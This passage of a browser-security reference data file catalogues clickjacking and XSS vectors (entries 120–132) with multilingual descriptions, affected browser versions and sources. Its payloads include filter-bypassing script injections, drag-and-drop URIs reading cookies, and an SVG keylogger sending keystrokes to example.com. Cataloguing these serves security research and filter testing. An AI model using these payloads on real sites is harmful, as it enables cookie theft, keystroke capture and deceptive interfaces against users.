        'data'       : '<script>\nfunction makePopups(){\n\tfor (i=1;i<6;i++) {\n\t\twindow.open(\'popup.html\',\'spam\'+i,\'width=50,height=50\');\n\t}\n}\n</script>\n\n<body>\n<a href="#" onclick="makePopups()">Spam</a>',        
        'description': {
            'en' : 'A web browser like Firefox distinguishes between trusted and not trusted events, depending on the situation. User interactions like a click will be trusted for the reason that they are made explicitly by the user. If a web page initiates an event like opening a pop-up window automatically, the event is not trusted and therefore blocked. Tests have shown that other browsers like Google Chrome or Opera behave similarly. With the use of clickjacking techniques, an attacker can get its victim to create a trusted event by clicking on a link that opens one or more pop-up windows.\n\nThus, an attacker can get the victim to unknowingly trigger a trusted event by doing a click. This event can be recycled by an attacker for later usage or directly used to e.g. generate pop-up windows that the user does not desire.',
            'ja' : '',
            'ru' : 'С целью блокировки незапрошенного пользователем открытия окон браузеры различают доверенные и недоверенные события в зависимости от ситуации. Взаимодействие с пользователем, такое как нажатие, является доверенным событием, т.к. исходит непосредственно от него. Если страница инициирует такое событие, как открытие всплывающего окна, автоматически, такое событие не является доверенным и поэтому блокируется. С использованием техники перехвата нажатий атакующий может побудить создать доверенное событие, которое будет переработано в создание одного или нескольких всплывающих окон.',
            'cs' : 'Webové prohlížeče, jako je například Firefox, rozlišují mezi důvěryhodnými a nedůvěryhodnými událostmi v závislosti na situaci. Například kliknutí na tlačítko se dá věřit, protože ji jednoznačně musel vyvolat uživatel. Pokud webová stránka zahájí otevírání pop-up okna automaticky, dojde k zablokování této akce. Testy prokázaly, že i jiné prohlížeče, jako jsou Google Chrome nebo Opera, se chovají podobně. Využitím technik clickjackingu může útočník donutit uživatele k vyvolání důvěryhodných akcí, které povedou k otevření jednoho nebo více pop-up oken.',
            'de' : ''
        },
        'urls'    : ['http://help.dottoro.com/ljoljvsn.php', 'http://ui-redressing.mniemietz.de/uiRedressing.pdf'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'internet explorer': ['5.0', '6.0', '7.0', '8.0', '9.0'],
            'firefox' : ['2.x', '3.0', '4.0', '15.0'], 
            'chrome': ['6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari': ['5.0', '5.1.7']
        },
        'tags'       : ['clickjacking', 'internet explorer', 'opera', 'firefox', 'chrome', 'safari', 'pop-up'],
        'reporter'   : 'mniemietz'
    },
	{ /* ID  - SVG masking */
        'id'         : 121,
        'category'   : 'clickjacking', 
        'name'       : {
            'en' : 'SVG masking',
            'ja' : '',
            'ru' : 'SVG-маскировка',
            'cs' : 'SVG maskování',
            'de' : ''
        },
        'data'       : '<html xmlns="http://www.w3.org/1999/xhtml"\nxmlns:svg="http://www.w3.org/2000/svg">\n<body style="background:gray">\n<iframe src="http://example.com/" style="width:800px; height:350px; border:none; mask: url(#maskForClickjacking);"/>\n<svg:svg>\n<svg:mask id="maskForClickjacking" maskUnits="objectBoundingBox" maskContentUnits="objectBoundingBox">\n\t<svg:rect x="0.0" y="0.0" width="0.373" height="0.3" fill="white"/>\n\t<svg:circle cx="0.45" cy="0.7" r="0.075" fill="white"/>\n</svg:mask>\n</svg:svg>\n</body>\n</html>', 
        'description': {
            'en' : 'Masking elements can greatly simplify a clickjacking attack. Here, a "body" tag with the "style" attribute "background:gray" is given. As the name suggests, the background of the web page will have the color gray. The "iframe" tag holds the attributes "src" and "style". The URL of the target web page is the value of the "src" attribute. Inside the "style" attribute there is information to the width, the height, and the border of the web page. Finally, there is the property "mask" with "url(#maskForClickjacking)". This "url" points to an SVG with the "id" value "maskForClickjacking".\n\nOn the next line, an "svg" tag with the namespace "svg" is deﬁned. After that, a "mask" tag with the attributes "id", "maskUnits" and "maskContentUnits" is inside the "svg" tag. The attribute "id" holds the value "maskForClickjacking", which is exactly the value inside the "url". The attribute "maskUnits" deﬁnes the coordinate system for the data of "x", "y", "width" and "height". The second attribute "maskContentUnits" deﬁnes the coordinate system for the contents of the "mask" with "objectBoundingBox". Inside the "mask" tag, there are two tags called "rect" and "circle". Each tag holds information to the position and is determined by the geometric shape the width and height or radius. The attribute "fill", with the value "white", ensures that the viewing whole in the mask is visible.',
            'ja' : '',
            'ru' : 'Маскировка элементов может сильно упрощать атаки по перехвату нажатий. В данном примере тело документа закрашивается в серый цвет, после чего подгружается ифрейм, к которому применяется стиль, содержащий ссылку на SVG-маску. Сама SVG-маска имеет атрибут maskUnits, определяющий систему координат для значений x, y, width и height, а также атрибут maskContentUnits, определяющий систему координат для содержимого маски. Обоим этим атрибутам установлено значение objectBoundingBox, что означает, что точкой отсчета будет являться условная рамка маскируемого объекта (ифрейма - в примере). Маска содержит два объекта - прямоугольник и круг, которые имеют атрибут fill (заполнение) со значением white, что делает их полностью прозрачными на сером фоне. Применение маски позволяет избирательно скрыть или показать отдельные элементы интерфейса подгружаемого ифрейма и опосредовать обращение к ним. SVG в данном случае выступает как чрезвычайно гибкий инструмент для таких действий, поскольку маска может "вырезать" из целевого интерфейса области любой формы.',
            'cs' : 'Maskování prvků může značně zjednodušit útoky typu clickjacking. V tomto příkladu je uveden prvek <body> s atributem "background:grey". Jak je napovězeno, bude pozadí stránky zobrazeno šedou barvou. Tag <iframe> má uvedeny atributy "src" a "style". Uvnitř atributu "style" jsou uvedeny informace o šířce a výšce rámu a o jeho okrajích. Dále je v tomto atributu uvedena vlastnost "mask" s hodnotou "url(#maskForClickjacking)". Toto "url" ukazuje na SVG s "id" hodnotou "maskForClickjacking".\n\nNa dalším řádku je uveden tag "SVG" s namespace "SVG". Po něm následuje tag "mask" s atributy "id", "maskUnits" a "maskContentUnits" uvnitř "SVG" tagu. Atribut "id" má hodnotu "maskForClickjacking", což je hodnota uvedená uvnitř "URL". Atribut "maskUnits" definuje souřadnicový systém "x", "y", "width" a "height". Druhý atribut "maskContentUnits" definuje souřadnicový systém pro obsah "mask" s "objectBoundingBox". Uvnitř tagu "mask" jsou dva tagy pojmenované "rect" a "circle". Každý tag má informace o poloze a geometrický tvar má svou šířku, výšku a poloměr. Atribut "fill" s hodnotou "white", zajišťuje, že zobrazování v celé masce je viditelné.',
            'de' : ''
        },
        'urls'    : ['http://www.w3.org/Graphics/SVG/', 'http://www.w3.org/TR/SVG/masking.html', 'http://www.gnucitizen.org/blog/even-more-advanced-clickjacking/'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'firefox' : ['3.x', '4.0', '15.0']
        },
        'tags'       : ['clickjacking', 'firefox', 'svg', 'masking'],
        'reporter'   : 'mniemietz'
    },
    { /* ID 122 - Sandboxed Iframes */
        'id'         : 122,
        'category'   : 'clickjacking', 
        'name'       : {
            'en' : 'Sandboxed Iframes',
            'ja' : '',
            'ru' : 'Ифрейм в песочнице',
            'cs' : '',
            'de' : ''
        },
        'data'       : '<iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>', 
        'description': {
            'en' : 'Google Chrome implements the HTML5 "sandboxed iframes". This particular example shows on how to turn this feature against websites only using JavaScript based frame-busters. Note that the framed website can still execute JavaScript - but has no privileges to modify the top frame\'s location. This would only be possible if the sandbox attribute also came with the "allow-top-navigation" parameter.',
            'ja' : '',
            'ru' : 'Google Chrome имплементировал "ифреймы в песочнице" - часть стандарта HTML5. Этот конкретный пример показывает, как повернуть эту возможность против сайтов, которые используют разрушители фреймов на основе JavaScript. Обратите внимание, что сайт в ифрейме остается способным выполнять JavaScript, но не имеет привилегий загружать себя в область top. Это может быть разрешено, только если атрибут sandbox ифрейма имеет также параметр allow-top-navigation .',
            'cs' : '',
            'de' : ''
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/the-iframe-element.html#attr-iframe-sandbox', 'http://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
            'chrome' : ['8.0', '23.0'],
            'safari' : ['5.1.7']
        },
        'tags'       : ['clickjacking', 'chrome', 'iframe', 'sandbox'],
        'reporter'   : 'kkotowicz'
    },
	{ /* ID 123 - Classjacking with jQuery */
        'id'         : 123,
        'category'   : 'clickjacking', 
        'name'       : {
            'en' : 'Classjacking with jQuery',
            'ja' : '',
            'ru' : 'Манипуляция с классом при помощи jQuery',
            'cs' : '',
            'de' : ''
        },
        'data'       : '<span class=foo>Some text</span>\n<a class=bar href="http://www.example.org">www.example.org</a>\n\n<script src="http://code.jquery.com/jquery-1.4.4.js"></script>\n<script>\n$("span.foo").click(function() {\nalert(\'foo\');\n$("a.bar").click();\n});\n$("a.bar").click(function() {\nalert(\'bar\');\nlocation="http://html5sec.org";\n});\n</script>', 
        'description': {
            'en' : 'CSS offers the attribute "class" as a selector to style a group of HTML elements. Consequently, it is feasible to style e.g. "span" and "a" tags. Here, the "span" tag has the value "foo" and the "a" tag the value "bar" inside the "class" attribute. This values can be used to define the font size or other CSS-specific properties.\n\nThe first "script" tag holds an "src" attribute with the value "http://code.jquery.com/jquery-1.4.4.js". It is a reference to a file of the "jQuery JavaScript Library v1.4.4". The name "jQuery" stands for a JavaScript Library that simplifies HTML document traversing, event handling, animating, and Ajax interactions. So it is ideally suited to deal with user interactions and to manipulate them, as required for complex UI redressing attacks. Thus, "jQuery" is given in the second "script" tag. At first, the "span" tag is selected, which holds the value "foo" in the "class" attribute. After that, ".click" is implemented. It can be used to bind an event handler to the "click" JavaScript event, or to trigger that event on an element.\n\nIn this case, an alert window will be executed with the text "foo" after clicking on the "Some text" value of the "span" tag. After closing the alert window, a click event is triggered on the "a" tag with the value "bar" inside the "class" attribute. Analogue to the first event, an alert window appears with the text "bar". After closing the alert window, the web browser will redirect the web page to "http://html5sec.org". If there is a click on the link "http://www.example.org" and not on the text "Some text", an alert window is displayed with the text "bar" followed by a redirection to "http://example.org" and not "http://html5sec.org". This behaviour follows from the "href" attribute.',
            'ja' : '',
            'ru' : 'Перед Вами две области, сформированные тегами <span>, <a> и идентифицируемые по значению атрибута class. К документу подключается библиотека jQuery, с помощью которой осуществляется переназначение обработчика события click и запуск этого события для тега <a> в тот момент, когда пользователь нажимает в область "Some text". В этом случае пользователь будет отправлен на сайт http://html5sec.org. Напротив, в случае клика непосредственно по тегу ссылки, пользователь перейдет на сайт http://www.example.org несмотря на то, что будет запущен обработчик события, который должен был бы изменить location на http://html5sec.org .',
            'cs' : '',
            'de' : ''
        },
        'urls'    : ['http://www.w3schools.com/Css/css_id_class.asp', 'http://jquery.com/', 'http://api.jquery.com/click/', 'http://ui-redressing.mniemietz.de/uiRedressing.pdf'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : ''
        },                        
        'browsers'   : {
		    'internet explorer': ['8.0'],
            'opera': ['10.x', '11.0', '12.0'], 
            'firefox' : ['2.x', '3.0', '4.0', '15.0'], 
            'chrome': ['8.0', '9.0', '10.0', '23.0'],
            'safari': ['5.0', '5.1.7']
        },
        'tags'       : ['clickjacking', 'classjacking', 'jQuery', 'class'],
        'reporter'   : 'mniemietz'
    },
    { /* ID 124 - Backslashes as alternative to slashes on Webkit */
        'id'        : 124,
        'category'  : 'html',
        'name'      : {
            'en'    : 'Backslashes as alternative to slashes on Webkit',
            'ja'    : '\u30b9\u30e9\u30c3\u30b7\u30e5\u306e\u304b\u308f\u308a\u306e\u5186\u8a18\u53f7\u0028\u30d0\u30c3\u30af\u30b9\u30e9\u30c3\u30b7\u30e5\u0029',
            'ru'    : 'Обратные слеши в Webkit',
            'cs'    : '',
            'de'    : '',
            'zh'    : 'Webkit 浏览器中反斜线替代斜线'
        },
        'data'      : '<script src=\"/\\example.com\\foo.js\"><\/script> \/\/ Safari 5.0, Chrome 9, 10\n<script src=\"\\\\example.com\\foo.js\"><\/script> \/\/ Safari 5.0',
        'description' : {
            'en'    : 'Safari treats backslashes the same way as slash inside URL attributes. Chrome treats prefix "/\\" of URL the same way as "\/\/".',
            'ja'    : 'Safari\u306fURL\u5c5e\u6027\u5024\u5185\u306e\u30d0\u30c3\u30af\u30b9\u30e9\u30c3\u30b7\u30e5\u0028\u5186\u8a18\u53f7\u0029\u3092\u30b9\u30e9\u30c3\u30b7\u30e5\u3068\u540c\u69d8\u306b\u6271\u3044\u307e\u3059\u3002Chrome\u306fURL\u5148\u982d\u306e\u0022\u002f\u005c\u0022\u3092\u0022\u002f\u002f\u0022\u3068\u540c\u69d8\u306b\u6271\u3044\u307e\u3059\u3002',
            'ru'    : 'Сафари и Хром придают обратным слешам в URL-параметрах то же значение, что и обычным.',
            'cs'    : '',
            'de'    : '',
            'zh'    : 'Safari 将内部URL属性中的反斜线当作斜线处理。chrome将URL头的”/\\”当作”\/\/”处理'
        },
        'urls'      : [],
        'howtofix'  : {
            'en'    : '',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'chrome': ['9.0', '10.0', '23.0'],
            'safari': [ '5.0', '5.1.7']
        },
        'tags'      : [ 'html', 'dom' ],
        'reporter'  : 'hasegawayosuke'
    },
    { /* ID 125 - SVG chameleon behavior via embedded XSLT */
        'id'        : 125,
        'category'  : 'svg',
        'name'      : {
            'en'    : 'SVG chameleon behavior via embedded XSLT',
            'ja'    : '',
            'ru'    : 'Хамелеонное поведение SVG с помощью XSLT',
            'cs'    : '',
            'de'    : ''
        },
        'data'      : '<?xml version="1.0"?>\r\n<?xml-stylesheet type="text/xml" href="#stylesheet"?>\r\n<!DOCTYPE doc [\r\n<!ATTLIST xsl:stylesheet\r\n  id    ID    #REQUIRED>]>\r\n<svg xmlns="http://www.w3.org/2000/svg">\r\n    <xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\r\n        <xsl:template match="/">\r\n            <iframe xmlns="http://www.w3.org/1999/xhtml" src="%js_uri_alert%"></iframe>\r\n        </xsl:template>\r\n    </xsl:stylesheet>\r\n    <circle fill="red" r="40"></circle>\r\n</svg>',
        'description' : {
            'en'    : 'This SVG chameleon file can be embedded via <embed> on most, and via <img> on most modern browsers. Thanks to the embedded XSLT stylesheet, it will change it\'s appearance, depending on how it is embedded or displayed. In an <img> tag it just shows a red dot. But opened directly or via an <iframe> or <embed>, the XSLT turns all SVG into (X)HTML and an alert will show. While most modern browsers show this behavior, Opera will completely mess it up, and show an alert when used via <embed> and an <iframe> when used via <img> (!). Chrome will show a broken image and an alert.',
            'ja'    : '',
            'ru'    : 'Этот хамелеонный SVG-документ может быть использован в теге <embed> в большинстве и в теге <img> в большинстве современных браузеров. Благодаря внедренному XSLT-стилю документ может изменять свой вид в зависимости от того, каким образом он показывается. Подключенный через тег <img> он покажет красный круг, но открытый напрямую или через <iframe> или <embed> (и аналогичные им) теги произойдет XSL-трансформация, и документ превратится ... превратится документ в (X)HTML c подключаемым <iframe>. Opera провалит тест показав ифрейм даже в теге <img>, а Safari и Google Chrome покажут испорченную картинку.',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : ['http://www.w3.org/Graphics/SVG/', 'http://www.w3.org/TR/xslt', 'http://www.dpawson.co.uk/xsl/sect2/onefile.html'],
        'howtofix'  : {
            'en'    : '',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'internet explorer': ['9.0'],
            'firefox': [ '3.x', '4.0', '15.0']
        },
        'tags'      : [ 'svg', 'html', 'chameleon', 'xslt', 'embedded', 'xss'],
        'reporter'  : '.mario'
    },
    { /* ID 126 - QuickTime events causing JavaScript execution */
        'id'        : 126,
        'category'  : 'html',
        'name'      : {
            'en'    : 'QuickTime events causing JavaScript execution',
            'ja'    : '',
            'ru'    : 'События QuickTime',
            'cs'    : '',
            'de'    : '',
            'zh'    : 'QuickTime 事件导致JavaScript代码执行'
        },
        'data'      : '<object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>\r\n<object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" onqt_error="%js_alert%" style="behavior:url(#x);"><param name=postdomevents /></object>',
        'description' : {
            'en'    : 'The below displayed construct enables usage of the more or less unknown QuickTime DOM events. Those contain an underscore - which is rather uncommon for event handlers and thus bypasses many blacklist based filters. The attack only works if both <object> tags are in place - and <object> tag 1 supplys the necessary behavior for object tag two.',
            'ja'    : '',
            'ru'    : 'Нижеприведенная конструкция демонстрирует использование более или менее неизвестных QuickTime DOM-событий. Поскольку они содержат нехарактерные для обработчиков подчеркивания, это может быть использовано для обхода многих фильтров, основанных на черных списках. Вектор работает, только если присутствуют оба объекта, где первый поставляет необходимое поведение для второго.',
            'cs'    : '',
            'de'    : '',
            'zh'    :'在上方展示的经过构造的用法或多或少会触发QuickTime的未知DOM事件。那些包含下划线”_”的事件句柄很罕见，使它可以绕过大多数黑名单过滤。这一攻击只有满足以下条件才能生效：两个<object>标签；前一个<object>标签为后一个<object>标签提供了必要的behavior'
        },
        'urls'      : ['http://developer.apple.com/library/mac/#documentation/QuickTime/Conceptual/QTScripting_JavaScript/bQTScripting_JavaScri_Document/QuickTimeandJavaScri.html#//apple_ref/doc/uid/TP40001526-CH001-SW6'],
        'howtofix'  : {
            'en'    : '',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'internet explorer': ['6.0', '7.0', '8.0', '9.0']
        },
        'tags'      : [ 'quicktime', 'html', 'event', 'object', 'classid', 'xss'],
        'reporter'  : '.mario'
    },    
    { /* ID 127 - JavaScript execution on Opera via listener delegation */
        'id'        : 127,
        'category'  : 'svg',
        'name'      : {
            'en'    : 'JavaScript execution on Opera via listener delegation',
            'ja'    : '',
            'ru'    : 'Делегация слушателя события в Opera',
            'cs'    : '',
            'de'    : '',
            'zh'    : 'Opera中通过listener执行JavaScript代码'
        },
        'data'      : '<svg xmlns="http://www.w3.org/2000/svg" id="x">\r\n<listener event="load" handler="#y" xmlns="http://www.w3.org/2001/xml-events" observer="x"/>\r\n<handler id="y">%js_alert%</handler>\r\n</svg>',
        'description' : {
            'en'    : 'The example vector - relating to #94 - shows how a combination of listener and hander tags can be used to delegate a load event from the SVG element to trigger actual JavaScript execution. So far only Opera supports the usage of XML events and related elements in this context. No user interaction is required to execute the JavaScript.',
            'ja'    : '',
            'ru'    : 'Данный пример, тесно связанный с #94, показывает, как комбинация элементов <listener> и <handler> позволяет назначить обработчик для события, происходящего в другом SVG-элементе.',
            'cs'    : '',
            'de'    : '',
            'zh'    : '示例向量，与#94相关，展示了listener标签和handler标签的组合是如何被利用，从SVG元素中加载事件去触发JavaScript，使其执行。到目前为止，只有Opera支持XML事件和相关元素。不需要用户交互即可执行JavaScript语句。'
        },
        'urls'      : ['http://www.opera.com/docs/specs/presto29/svg/elements/', 'http://www.w3.org/TR/SVGMobile12/script.html#ListenerElement', 'http://www.w3.org/TR/2010/NOTE-xml-events2-20101216/Overview.html#section-eventhandlers', '#85', '#94', '#104'],
        'howtofix'  : {
            'en'    : '',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'opera': ['9.0', '10.0', '11.0', '12.0']
        },
        'tags'      : [ 'svg', 'opera', 'xml', 'events', 'listener', 'handler', 'xss'],
        'reporter'  : '.mario'
    },
    { /* ID 128 - Firefox parsing entity encoded HTML in SVG */
        'id'        : 128,
        'category'  : 'svg',
        'name'      : {
            'en'    : 'Firefox parsing entity encoded HTML in SVG',
            'ja'    : '',
            'ru'    : 'Декодирование HTML-эквивалентов при копировании с помощью innerHTML в Firefox (4)',
            'cs'    : '',
            'de'    : '',
            'zh'    : 'Firefox 解析SVG中被编码的HTML实体'
        },
        'data'      : '<svg><style>&lt;img/src=x onerror=%js_alert%// </b>',
        'description' : {
            'en'    : 'Firefox 4 allows HTML entities used in plain-text tags such as style, nostyle, noframes and others to represent their canonical form. This leads to possibilities bypassing filters despite of proper HTML encoding as the example demonstrates - especially when inline SVG and innerHTML copy access are being used. This bug has been fixed in most recent Firefox versions.',
            'ja'    : '',
            'ru'    : 'Firefox 4 при копировании с помощью innerHTML декодировал HTML-эквиваленты внутри тегов с тестовым содержимым таких, как style, nostyle, noframes и других, в их первообраз, что могло приводить к обходу фильтров, которые допускают SVG и кодируют опасные символы, и результат которых в последствии неправильно использовался в логике innerHTML. Эта ошибка была исправлена в Firefox 5.',
            'cs'    : '',
            'de'    : '',
            'zh'    : 'Firefox 4允许HTML实体被用在纯文本标签中去表示他们原有的含义，例如style，nostyle，noframes和其他标签。尽管HTML已经被编码，但是这一特性仍有可能导致绕过过滤，特别是在内联SVG和innerHTML的拷贝被使用时。这一bug已在最新的Firefox中修复。'
        },
        'urls'      : ['http://www.mozilla.org/security/announce/2011/mfsa2011-27.html', 'https://developer.mozilla.org/en/svg_in_html_introduction','#59','#97','#98'],
        'howtofix'  : {
            'en'    : '',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'firefox': ['4.0', 'end']
        },
        'tags'      : [ 'svg', 'xss', 'inline', 'entities', 'firefox', 'css', 'xml', 'innerhtml'],
        'reporter'  : '.mario'
    },
    { /* ID 129 - Opera active JavaScript execution via STYLE in SVG  */
        'id'        : 129,
        'category'  : 'svg',
        'name'      : {
            'en'    : 'Opera active JavaScript execution via STYLE in SVG',
            'ja'    : '',
            'ru'    : 'Активный скриптинг через SVG-стили в Опере',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'data'      : '<svg>\n<image style=\'filter:url("data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22><script>parent.%js_alert%</script></svg>")\'>\n<!--\nSame effect with\n<image filter=\'...\'>\n-->\n</svg>',
        'description' : {
            'en'    : 'Additional to script execution via "xlink:href" in SVG elements such as <image>, <animation>, <foreignObject>, Opera 11 allows to utilize filters (as well as other CSS properties listed in #109) to accomplish the same. Note that either these CSS properties, as well as the analogous attributes (the filter attribute in particular) can be used in this case. Both style and analogous attributes in inline SVG should be considered unsafe.',
            'ja'    : '',
            'ru'    : 'Вместо атрибута "xlink:href" для запуска скриптов в SVG-тегах <image>, <animation>, <foreignObject> могут быть использованы стилевые свойства, перечисленные в #109.',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : ['#88', '#109'],
        'howtofix'  : {
            'en'    : 'Do not allow style and filter attributes inside user generated SVG data. It\'s considerably the best to generally avoid user generated SVG data - if possible.',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'opera': ['11.60', '12.0']
        },
        'tags'      : [ 'svg', 'xss', 'inline', 'opera', 'css', 'style'],
        'reporter'  : 'LeverOne'
    },
    { /* ID 130 - Passive JavaScript execution via MathML on Firefox  */
        'id'        : 130,
        'category'  : 'html5',
        'name'      : {
            'en'    : 'Passive JavaScript execution via MathML on Firefox',
            'ja'    : '',
            'ru'    : 'Пассивный скриптинг в Firefox с использованием MathML',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'data'      : '<math href="%js_uri_alert%">CLICKME</math>\r\n\r\n<math>\r\n<!-- up to FF 13 -->\r\n<maction actiontype="statusline#http://google.com" xlink:href="%js_uri_alert_2%">CLICKME</maction>\r\n\r\n<!-- FF 14+ -->\r\n<maction actiontype="statusline" xlink:href="%js_uri_alert_3%">CLICKME<mtext>http://http://google.com</mtext></maction>\r\n</math>',
        'trigger'   : 'document.getElementsByTagName("math")[0].click()',
        'description' : {
            'en'    : 'Modern Firefox versions allow usage of inline MathML. While other user agents don\'t support the href attribute for MathML elements (yet), Firefox does and thereby enables passive JavaScript execution. Note that supporting href for MathML elements is a feature - introduced with MathML 3. The same effect can be observed by using xlink:href. The statusline action further enables obfuscation of the actual link target - and in this example hides the JavaScript URI.',
            'ja'    : '',
            'ru'    : 'Наряду с SVG современные версии Firefox имеют встроенную поддержку MathML на HTML-страницах. Данный браузер первым реализовал атрибут href, который является частью стандарта MathML3, что открывает возможность типичного способа запуска JavaScript. Обратите внимание на поведение, создаваемое атрибутом actiontype в данном примере, который позволяет скрывать полезную нагрузку в статусной панели.',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : ['http://www.w3.org/Math/', 'https://bugzilla.mozilla.org/show_bug.cgi?id=534968' , '#87'],
        'howtofix'  : {
            'en'    : 'Do not allow users to submit unfiltered MathML content.',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'firefox': ['6', '7', '8', '9', '10', '11', '15']
        },
        'tags'      : [ 'mathml', 'xss', 'inline', 'firefox'],
        'reporter'  : '.mario'
    },
    { /* ID 131 - Passive XSS via Drag&Drop of specially crafted URIs  */
        'id'        : 131,
        'category'  : 'clickjacking',
        'name'      : {
            'en'    : 'Passive XSS via Drag&Drop of specially crafted URIs',
            'ja'    : '',
            'ru'    : 'Пассивный скриптинг с использованием специально сформированного идентификатора ресурса',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'data'      : '<b>drag and drop one of the following strings to the drop box:</b>\r\n<br/><hr/>\r\njAvascript:alert(\'Top Page Location: \'+document.location+\' Host Page Cookies: \'+document.cookie);//\r\n<br/><hr/>\r\nfeed:javascript:alert(\'Top Page Location: \'+document.location+\' Host Page Cookies: \'+document.cookie);//\r\n<br/><hr/>\r\nfeed:data:text/html,&#x3c;script>alert(\'Top Page Location: \'+document.location+\' Host Page Cookies: \'+document.cookie)&#x3c;/script>&#x3c;b>\r\n<br/><hr/>\r\nfeed:feed:javAscript:javAscript:feed:alert(\'Top Page Location: \'+document.location+\' Host Page Cookies: \'+document.cookie);//\r\n<br/><hr/>\r\n<div id="dropbox" style="height: 360px;width: 500px;border: 5px solid #000;position: relative;" ondragover="event.preventDefault()">+ Drop Box +</div>',
        'description' : {
            'en'    : 'It is possible to bypass Mozilla Firefox (tested on version 8.x and 9.x) internal protection and execute JavaScript Drag and Drop by using capitalization and Feed protocol, and to run that JavaScript on the top page if you can include the malicious page in an IFrame. The "event.preventDefault()" method in "ondragover" event of the element is to block the natural function of the browser. Usually the malicious IFrame should deceive the user to drag and drop a JS to the drop box which can be concealed in a hidden "Textarea" element.',
            'ja'    : '',
            'ru'    : 'В примере продемонстрированы способы обхода внутренней защиты Firefox от выполнения JavaScript кода при перетаскивании выделенной строки в целевую область. Как видно из примера, способы сводились к использованию верхнего регистра и протокола feed. Опасность данного примера состояла, в частности, в том, что он позволял выполнить JavaScript-код в контексте главной страницы, если в неё удавалось внедрить опасный iframe элемент и тем или иным образом спровоцировать пользователя выполнить перетаскивание замаскированной полезной нагрузки. Назначение метода event.preventDefault() события ondragover в блокировке изначального поведения браузера. Хотя эти способы были закрыты в дальнейшем, однако примеры с протоколом feed до сих пор работают при классическом использовании в URI тега.',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'urls'      : ['https://bugzilla.mozilla.org/show_bug.cgi?id=704354', 'http://soroush.secproject.com/blog/2011/12/drag-and-drop-xss-in-firefox-by-html5-cross-domain-in-frames/'],
        'howtofix'  : {
            'en'    : '',
            'ja'    : '',
            'ru'    : '',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'browsers'  : {
            'firefox': ['6', '7', '8', '9', '10.0.2', 'end']
        },
        'tags'      : [ 'drag&drop', 'html5', 'iframe', 'feed', 'firefox'],
        'reporter'  : 'irsdl'
    },
    { /* ID 132 - SVG <set> and <animate> elements allow key-logging w/o JavaScript  */
        'id'        : 132,
        'category'  : 'svg',
        'name'      : {
            'en'    : 'SVG <set> and <animate> elements allow key-logging w/o JavaScript',
            'ja'    : '',
            'ru'    : 'Перехват нажатий клавиш с использованием SVG-элементов <set> и <animate>',
            'cs'    : '',
            'de'    : '',
            'zh'    : ''
        },
        'data'      : '<!doctype html>\r\n<form>\r\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\r\n<br>\r\n<input name="secret" type="password">\r\n</form>\r\n<!-- injection --><svg height="50px">\r\n<image xmlns:xlink="http://www.w3.org/1999/xlink">\r\n<set attributeName="xlink:href" begin="accessKey(a)" to="//example.com/?a" />\r\n<set attributeName="xlink:href" begin="accessKey(b)" to="//example.com/?b" />\r\n<set attributeName="xlink:href" begin="accessKey(c)" to="//example.com/?c" />\r\n<set attributeName="xlink:href" begin="accessKey(d)" to="//example.com/?d" />\r\n</image>\r\n</svg>',
        'description' : {
            'en'    : 'It is possible to achieve an injection capable to exfiltrate keyboard events without any JavaScript execution via SVG and set/animate timing attributes. In essence, an access key can be specified to trigger events inside an SVG. In case an inline SVG is being used, the listener for these keys observes the whole document - and not just the SVG itself. This means that even keystrokes into a form input trigger the SVG access key handler.\r\n\r\nOnce this access key handler is being combined with adding a new keystroke-depending image source to an existing image, the form input will be filled, and the SVG will reset a hidden image source according to the key being pressed and thereby silently exfiltrate the data.\r\n\r\nSince all this works without using any JavaScript, it was also possible to execute this attack in latest Thunderbird versions - with the vector invisibly wrapped inside the mail-body.\r\n\r\nThe problem has been reported and fixed, CVE-2011-3663 has been assigned. Current stable versions of Firefox still allow to observe the problem - using a network traffic monitor/Firebug is recommended.',
            'ja'    : '',
